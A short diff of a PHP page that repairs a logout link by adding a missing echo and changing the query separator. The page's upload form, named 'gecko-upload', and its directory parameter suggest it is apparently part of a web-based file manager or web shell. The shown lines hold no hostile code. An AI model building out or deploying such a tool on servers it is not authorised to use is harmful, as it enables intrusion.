@@ -211,7 +211,7 @@ if (isset($_GET['d'])) {
                 <input type="file" name="gecko-upload" class="form-file" />
                 <input type="submit" value="Upload" name="gecko-up-submit" class="bg-blue-100 text-blue-700 font-sm font-mono cursor-pointer px-3 py-1 rounded-md hover:bg-blue-400" />
             </form>
-            <li><a href="<?php get_current_full_url_short() . '?logout' ?>" class="btn-submit"><i class="fa-solid fa-close"></i>Logout</a></li>
+            <li><a href="<?php echo get_current_full_url_short() . '&logout' ?>" class="btn-submit"><i class="fa-solid fa-close"></i>Logout</a></li>
         </ul>
     </div>
 </body>
